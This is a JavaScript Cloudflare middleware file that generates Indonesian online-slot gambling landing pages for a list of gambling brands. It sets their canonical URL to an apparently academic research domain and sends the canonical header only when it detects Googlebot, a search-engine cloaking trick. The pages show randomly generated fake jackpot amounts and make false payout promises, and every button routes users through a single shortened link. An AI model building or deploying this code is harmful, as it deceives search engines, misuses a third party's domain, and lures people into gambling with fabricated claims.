// functions/_middleware.js - Modified for rotating links with improved Google detection and no caching

export async function onRequest(context) {
  const { request, env, next } = context;
  const url = new URL(request.url);
  
  // Check if request is from GoogleBot or AMP cache
  const userAgent = request.headers.get('User-Agent') || '';
  console.log('Received User-Agent:', userAgent);
  
  // Deteksi Google dengan lebih spesifik
  const isGooglebot = userAgent.includes('Googlebot');
  const isGoogleAMP = userAgent.includes('Google-AMP');
  const isAMPCacheFromGoogle = url.hostname.includes('cdn.ampproject.org');
  const isAMPCacheFromCloudflare = url.hostname.includes('amp.cloudflare.com');
  
  // Gabungkan semua kondisi untuk Google
  const isFromGoogle = isGooglebot || isGoogleAMP || isAMPCacheFromGoogle || isAMPCacheFromCloudflare;
  
  console.log('Google detection:', {
    isGooglebot,
    isGoogleAMP,
    isAMPCacheFromGoogle,
    isAMPCacheFromCloudflare,
    isFromGoogle
  });
  
  // If this is a request for target.txt, let it process normally
  if (url.pathname.endsWith('/target.txt')) {
    return next();
  }
  
  try {
    // Read target.txt file (assuming this file exists in assets or public folder)
    let targetContent;
    try {
      // Use Cloudflare KV or file system to read target.txt
      const targetResponse = await fetch(new URL('/target.txt', url.origin));
      
      if (!targetResponse.ok) {
        throw new Error(`Failed to fetch target.txt: ${targetResponse.status}`);
      }
      
      targetContent = await targetResponse.text();
    } catch (error) {
      console.error('Error loading target.txt:', error);
      // If target.txt cannot be read, use fallback data
      targetContent = 'kids 77\nkerasakti 777\nkingkong39\nkitty223\nusutoto\nstars88\nbtcplay\nkodokwin\nkubujp\nkudabet88';
    }
    
    // Parse content from target.txt into array with correct URL format
    const sitesMap = new Map(); // To store originalName -> urlFormat pairs
    
    // Array for display and processing
    const sites = targetContent.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    
    // Create map to look up site names and URL formats
    sites.forEach(site => {
      // URL Format: If site contains spaces, replace with hyphens
      let urlFormat = site;
      if (site.includes(' ')) {
        urlFormat = site.replace(/\s+/g, '-');
      }
      // Save to map for later reference
      sitesMap.set(urlFormat.toLowerCase(), site);
      // Also save version without hyphens, without spaces
      sitesMap.set(site.toLowerCase().replace(/\s+/g, ''), site);
    });
    
    // Find out which site is being accessed
    const pathSegments = url.pathname.split('/').filter(segment => segment);
    const currentSite = pathSegments.length > 0 ? pathSegments[0].toLowerCase() : '';
    
    // Check if accessed site is in the map
    const originalSiteName = sitesMap.get(currentSite) || 
                             sitesMap.get(currentSite.replace(/-/g, '')) ||
                             sitesMap.get(currentSite.replace(/-/g, ' '));
    
    if (originalSiteName || pathSegments.length === 0) {
      // Choose site based on path or use random if path is empty
      const siteToUse = originalSiteName || sites[Math.floor(Math.random() * sites.length)];
      
      // Create correct URL format for canonical
      let urlFormattedSite = siteToUse;
      if (siteToUse.includes(' ')) {
        urlFormattedSite = siteToUse.replace(/\s+/g, '-');
      }
      
      // Create canonical URL
      const canonicalOrigin = 'https://penelitian.stikesmuwsb.ac.id'; // Replace with your actual domain
      const canonicalUrl = `${canonicalOrigin}/${urlFormattedSite}/`;
      
      console.log('Generated canonical URL:', canonicalUrl);
      
      // Generate AMP HTML with self-contained design
      const ampHtml = generateAmpHtml(siteToUse, canonicalUrl, sites);
      
      // Add required AMP headers
      const headers = new Headers();
      headers.set('Content-Type', 'text/html');
      headers.set('AMP-Cache-Transform', 'google;v="1..100"');
      
      // PENTING: Hanya tambahkan Link header jika dari Google
      if (isFromGoogle) {
        console.log('Request from Google detected, adding canonical Link header');
        headers.set('Link', `<${canonicalUrl}>; rel="canonical"`);
      } else {
        console.log('Not a Google request, skipping canonical Link header');
      }
      
      // ANTI-CACHING HEADERS - Untuk memastikan cache Cloudflare selalu dihapus
      headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
      headers.set('Pragma', 'no-cache');
      headers.set('Expires', '0');
      
      // Tambahkan header khusus Cloudflare untuk mencegah cache
      headers.set('CDN-Cache-Control', 'no-cache');
      headers.set('Cloudflare-CDN-Cache-Control', 'no-cache');
      headers.set('Surrogate-Control', 'no-store');
      
      // Tambahkan timestamp untuk memastikan konten selalu dianggap baru
      const timestamp = Date.now();
      headers.set('X-Last-Modified', timestamp.toString());
      
      // Tambahkan random value untuk memastikan respons tidak di-cache
      const randomValue = Math.random().toString(36).substring(2, 15);
      headers.set('X-Random', randomValue);
      
      return new Response(ampHtml, {
        headers: headers
      });
    }
    
    // If site not found, continue to next handler
    return next();
    
  } catch (error) {
    console.error('Error in middleware:', error);
    return new Response('Internal Server Error', { status: 500 });
  }
}

// Function to generate complete AMP HTML with improved design and rotating links
function generateAmpHtml(siteName, canonicalUrl, allSites) {
  // Generate random jackpot value
  const jackpotValue = generateRandomJackpot();
  
  // Generate varied descriptions and content
  const descriptions = [
    `${siteName.toUpperCase()} situs slot gacor terpercaya dengan koleksi game slot terlengkap, bonus menarik, dan jackpot terbesar. Daftar sekarang untuk maxwin paling tinggi!`,
    `Main slot online di ${siteName.toUpperCase()} dengan rtp tertinggi dan peluang maxwin besar. Nikmati bonus new member 100% dan pelayanan super kencang 24 jam.`,
    `${siteName.toUpperCase()} salah satu situs slot gacor terbaik datang kembali untuk membuka peluang kepada slotter handal dari indonesia untuk menjadi kaya. Deposit 10ribu sudah bisa wd jutaan!`,
    `Situs slot gacor ${siteName.toUpperCase()} paling aman ga pake ribet! Mainkan beragam game slot populer dengan peluang maxwin paling tinggi dan jackpot terbesar.`
  ];
  
  const randomDesc = descriptions[Math.floor(Math.random() * descriptions.length)];
  
  // Create array of login URLs to rotate through
  const loginUrls = [
    "https://tinyurl.com/3ysdexx3",
    "https://tinyurl.com/3ysdexx3",
    "https://tinyurl.com/3ysdexx3",
    "https://tinyurl.com/3ysdexx3",
    "https://tinyurl.com/3ysdexx3",
    "https://tinyurl.com/3ysdexx3"
  ];
  
  // Convert the array to JSON string for AMP state
  const loginUrlsJson = JSON.stringify(loginUrls);
  
  // Tambahkan timestamp acak ke HTML untuk mencegah caching
  const timestamp = Date.now();
  const randomValue = Math.random().toString(36).substring(2, 15);
  
  // Complete AMP HTML template with improved design and rotating links
  return `<!doctype html>
<html ⚡ lang="id">
<head>
  <meta charset="utf-8">
  <title>${siteName.toUpperCase()} - SITUS SLOT GACOR PALING GAMPANG CUAN</title>
  <link rel="canonical" href="${canonicalUrl}">
  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
  <meta name="description" content="${randomDesc}">
  <meta name="keywords" content="${siteName}, slot online, judi slot, slot gacor, slot maxwin, slot terpercaya, slot gampang menang">
  
  <!-- Custom meta tags -->
  <meta name='author' content='${siteName}' />
  <meta name='language' content='id-ID' />
  <meta name='robots' content='index, follow' />
  <meta name='Slurp' content='all' />
  <meta name='webcrawlers' content='all' />
  <meta name='spiders' content='all' />
  <meta name='allow-search' content='yes' />
  <meta name='YahooSeeker' content='index,follow' />
  <meta name='msnbot' content='index,follow' />
  <meta name='expires' content='never' />
  <meta name='rating' content='general'>
  <meta name='publisher' content='${siteName}'>
  <meta name='googlebot' content='index,follow' />
  
  <script async src="https://cdn.ampproject.org/v0.js"></script>
  <script async custom-element="amp-bind" src="https://cdn.ampproject.org/v0/amp-bind-0.1.js"></script>
  <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
  <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>

  <style amp-custom>
    /* Base Styles with improved aesthetics */
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
      background-color: #0a0a0a;
      color: #ffffff;
      line-height: 1.6;
    }
    
    /* Banner image styling */
    .banner-image {
      margin: 15px 0 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 215, 0, 0.3);
    }
    
    a {
      text-decoration: none;
      color: inherit;
      display: inline-block;
    }
    
    /* Improved Header Styles */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 20px;
      background: linear-gradient(to bottom, #1a1a1a, #0f0f0f);
      border-bottom: 2px solid #ffc107;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
    }
    
    .logo-container {
      display: flex;
      align-items: center;
    }
    
    .logo {
      max-width: 200px;
      height: auto;
    }
    
    .main-nav {
      display: flex;
      gap: 15px;
      align-items: center;
    }
    
    .nav-link {
      color: #ffffff;
      font-weight: 500;
      padding: 5px 10px;
      border-radius: 4px;
      transition: all 0.2s ease;
    }
    
    .nav-link:hover {
      background-color: rgba(255, 255, 255, 0.1);
    }
    
    .login-btn {
      background: linear-gradient(45deg, #ffc107, #ffeb3b);
      color: #000;
      padding: 8px 25px;
      border-radius: 25px;
      font-weight: bold;
      border: none;
      text-shadow: 0 1px 0 rgba(255, 255, 255, 0.3);
      transition: all 0.3s ease;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
    }
    
    .login-btn:hover {
      box-shadow: 0 0 20px rgba(255, 193, 7, 0.8);
      transform: translateY(-2px) scale(1.05);
    }
    
    /* Animation for login button */
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    
    .login-btn-animated {
      animation: pulse 1.5s infinite;
    }
    
    /* Improved Main Content Styles */
    .main-container {
      max-width: 1000px;
      margin: 20px auto;
      padding: 25px;
      background: linear-gradient(135deg, #1a1a1a, #222222);
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(255, 215, 0, 0.2);
    }
    
    .main-container::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 5px;
      background: linear-gradient(to right, #ffc107, #ff9800);
    }
    
    .site-title {
      font-size: 16px;
      font-weight: 400;
      color: #ffc107;
      margin-bottom: 15px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .hero-title {
      font-size: 28px;
      font-weight: 700;
      line-height: 1.3;
      margin-bottom: 20px;
      text-transform: uppercase;
      color: #ffffff;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
    }
    
    .brand-highlight {
      display: block;
      font-size: 36px;
      color: #ffc107;
      margin: 15px 0;
      text-shadow: 0 0 15px rgba(255, 193, 7, 0.7);
      letter-spacing: 2px;
    }
    
    .site-slogan {
      font-size: 16px;
      font-style: italic;
      color: #e0e0e0;
      margin-bottom: 30px;
      padding-left: 10px;
      border-left: 3px solid #ffc107;
    }
    
    /* Improved Button Styles */
    .action-buttons {
      display: flex;
      gap: 20px;
      margin: 30px 0;
    }
    
    .register-btn, .login-block-btn {
      flex: 1;
      display: block;
      padding: 15px 20px;
      text-align: center;
      border-radius: 10px;
      font-weight: bold;
      text-transform: uppercase;
      font-size: 16px;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    }
    
    .register-btn {
      background: linear-gradient(45deg, #ffc107, #ffeb3b);
      color: #000000;
      border: none;
    }
    
    .login-block-btn {
      background: linear-gradient(45deg, #2196f3, #03a9f4);
      color: #ffffff;
      border: none;
    }
    
    .register-btn::before, .login-block-btn::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: rgba(255, 255, 255, 0.1);
      transform: rotate(45deg);
      transition: all 0.5s ease;
      opacity: 0;
    }
    
    .register-btn:hover::before, .login-block-btn:hover::before {
      opacity: 1;
      transform: rotate(45deg) translate(20%, 20%);
    }
    
    .register-btn:hover, .login-block-btn:hover {
      transform: translateY(-5px);
      box-shadow: 0 7px 20px rgba(0, 0, 0, 0.4);
    }
    
    /* Site Info Styles with better formatting */
    .site-headline {
      text-align: center;
      font-size: 24px;
      font-weight: 700;
      text-transform: uppercase;
      margin: 40px 0 25px;
      color: #ffc107;
      position: relative;
      padding-bottom: 15px;
    }
    
    .site-headline::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 3px;
      background: linear-gradient(to right, #ffc107, transparent);
    }
    
    .site-description {
      text-align: justify;
      color: #e0e0e0;
      margin-bottom: 30px;
      font-size: 15px;
      line-height: 1.7;
      padding: 15px;
      background-color: rgba(0, 0, 0, 0.2);
      border-radius: 8px;
      border-left: 3px solid #ffc107;
    }
    
    /* Jackpot display */
    .jackpot-container {
      background: linear-gradient(45deg, #222222, #333333);
      border-radius: 10px;
      padding: 15px;
      margin: 30px 0;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      text-align: center;
      border: 1px solid rgba(255, 215, 0, 0.3);
    }
    
    .jackpot-title {
      font-size: 18px;
      color: #ffffff;
      margin-bottom: 10px;
    }
    
    .jackpot-value {
      font-size: 28px;
      font-weight: 700;
      color: #ffc107;
      text-shadow: 0 0 10px rgba(255, 193, 7, 0.6);
      letter-spacing: 1px;
    }
    
    /* Improved Footer Styles */
    .footer {
      background: linear-gradient(to top, #0a0a0a, #151515);
      padding: 20px;
      text-align: center;
      font-size: 13px;
      color: #999999;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      margin-top: 30px;
    }
    
    .copyright {
      margin-top: 10px;
    }
    
    /* Responsive Styles with improvements */
    @media (max-width: 768px) {
      .hero-title {
        font-size: 22px;
      }
      
      .brand-highlight {
        font-size: 28px;
      }
      
      .action-buttons {
        flex-direction: column;
      }
      
      .site-headline {
        font-size: 20px;
      }
      
      .jackpot-value {
        font-size: 24px;
      }
    }
    
    @media (max-width: 480px) {
      .header {
        padding: 10px 15px;
      }
      
      .main-nav {
        gap: 10px;
      }
      
      .login-btn {
        padding: 6px 15px;
        font-size: 14px;
      }
      
      .hero-title {
        font-size: 20px;
      }
      
      .brand-highlight {
        font-size: 24px;
      }
      
      .site-headline {
        font-size: 18px;
      }
      
      .main-container {
        padding: 20px 15px;
        margin: 15px;
      }
      
      .register-btn, .login-block-btn {
        padding: 12px 15px;
        font-size: 14px;
      }
      
      .jackpot-value {
        font-size: 20px;
      }
    }
  </style>

</head>

<body>

  <!-- AMP State Data - Including rotating links -->
  <amp-state id="siteData">
    <script type="application/json">
      {
        "name": "${siteName.toUpperCase()}",
        "canonicalUrl": "${canonicalUrl}",
        "jackpot": "${jackpotValue}",
        "currentUrlIndex": 0,
        "loginUrls": ${loginUrlsJson}
      }
    </script>
  </amp-state>

  <!-- Header -->
  <header class="header">
    <div class="logo-container">
      <a href="https://tinyurl.com/3ysdexx3">
        <amp-img class="logo" src="https://pub-bc2ee8893baf416c8c23af0718d51fc3.r2.dev/slotgacorwin.gif" width="200" height="50" layout="fixed" alt="${siteName.toUpperCase()}"></amp-img>
      </a>
    </div>
    <nav class="main-nav">
      <a href="https://tinyurl.com/3ysdexx3" class="nav-link">Home</a>
      <a href="https://tinyurl.com/3ysdexx3" 
         class="login-btn login-btn-animated"
         [href]="siteData.loginUrls[siteData.currentUrlIndex]"
         on="tap:AMP.setState({
           siteData: {
             currentUrlIndex: (siteData.currentUrlIndex + 1) % siteData.loginUrls.length
           }
         })">Login ⭐️</a>
    </nav>
  </header>
  
  <!-- Main Content -->
  <main class="main-container">
    <div class="site-title">${siteName}</div>
    
    <!-- Added banner image above the hero title -->
    <div class="banner-image">
      <amp-img src="https://i.imgur.com/XGlU7h5.png" 
               width="412" 
               height="412" 
               layout="responsive" 
               alt="Banner ${siteName}">
      </amp-img>
    </div>
    
    <h1 class="hero-title">
      COBA DAN RASAKAN MAIN SLOTMU DENGAN MAXWIN PALING TINGGI BERSAMA
      <span class="brand-highlight">${siteName.toUpperCase()}</span>
    </h1>
    
    <div class="site-slogan">Situs Slot Gacor Paling Aman Ga Pake Ribet!</div>
    <div class="action-buttons">
      <a href="https://tinyurl.com/3ysdexx3" 
         class="register-btn"
         [href]="siteData.loginUrls[siteData.currentUrlIndex]"
         on="tap:AMP.setState({
           siteData: {
             currentUrlIndex: (siteData.currentUrlIndex + 1) % siteData.loginUrls.length
           }
         })">Daftar ${siteName}</a>
      <a href="https://tinyurl.com/3ysdexx3" 
         class="login-block-btn"
         [href]="siteData.loginUrls[siteData.currentUrlIndex]"
         on="tap:AMP.setState({
           siteData: {
             currentUrlIndex: (siteData.currentUrlIndex + 1) % siteData.loginUrls.length
           }
         })">Login ${siteName}</a>
    </div>    
    <!-- Added jackpot display -->
    <div class="jackpot-container">
      <div class="jackpot-title">JACKPOT TERKINI:</div>
      <div class="jackpot-value">${jackpotValue}</div>
    </div>
    

    
    <h2 class="site-headline">${siteName.toUpperCase()} SITUS SLOT GACOR PALING GAMPANG CUAN</h2>
    
    <div class="site-description">
      ${siteName.toUpperCase()} salah satu situs slot gacor terbaik datang kembali untuk membuka peluang kepada slotter handal dari indonesia untuk menjadi kaya. ${siteName} deposit 10ribu sudah bisa wd jutaan, pelayanan super kencang, rtp akurat dan pastinya member baru lama pasti dimanja paling penting wd kecil besar wajib pay.
    </div>
    
    <!-- Optional: Game Categories Section -->
    <div class="site-headline">GAME POPULER ${siteName.toUpperCase()}</div>
    
    <div class="site-description">
      Di ${siteName.toUpperCase()}, kami menyediakan beragam permainan slot dari provider terbaik seperti Pragmatic Play, Habanero, Microgaming, dan PG Soft. Nikmati sensasi bermain slot dengan tingkat kemenangan tinggi dan jackpot progressive yang bisa Anda menangkan setiap harinya. Ayo bergabung sekarang dan raih kemenangan besar!
    </div>
    
  </main>
  
  <!-- Footer -->
  <footer class="footer">
    <div>Situs Slot Online Terpercaya di Indonesia</div>
    <div class="copyright">Copyright © ${new Date().getFullYear()} ${siteName.toUpperCase()}. All rights reserved.</div>
  </footer>
</body>
</html>`;
}

// Function to generate random jackpot value
function generateRandomJackpot() {
  const billions = Math.floor(Math.random() * 10); // 0-9 billion
  const millions = Math.floor(Math.random() * 1000); // 0-999 million
  const thousands = Math.floor(Math.random() * 1000); // 0-999 thousand
  const hundreds = Math.floor(Math.random() * 1000); // 0-999 hundred
  
  return `Rp ${billions},${millions.toString().padStart(3, '0')},${thousands.toString().padStart(3, '0')},${hundreds.toString().padStart(3, '0')}`;
}

// Function to randomize array
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}
